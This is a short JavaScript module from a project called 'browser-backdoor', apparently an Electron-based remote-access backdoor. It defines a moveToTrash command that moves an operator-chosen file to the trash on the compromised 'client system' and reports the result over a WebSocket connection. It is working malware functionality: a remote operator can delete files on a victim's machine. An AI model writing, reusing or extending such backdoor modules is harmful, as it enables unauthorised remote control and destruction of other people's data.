// INTERACTIVE
/**
 * @file moveToTrash Module
 * @summary Moves a file to the trash on the client system.
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');

/**
 * @param {String} fullPath - The full path of the file to move to the trash.
 * @return {String} "Moved $fullPath to trash"
 */
moveToTrash = function (fullPath) {
    electron.shell.moveItemToTrash(fullPath);
    ws.send("Moved " + fullPath + " to trash");
}

ws.send("\nUsage: moveToTrash(fullPath)\n- fullPath is the properly escaped full path of the file.");
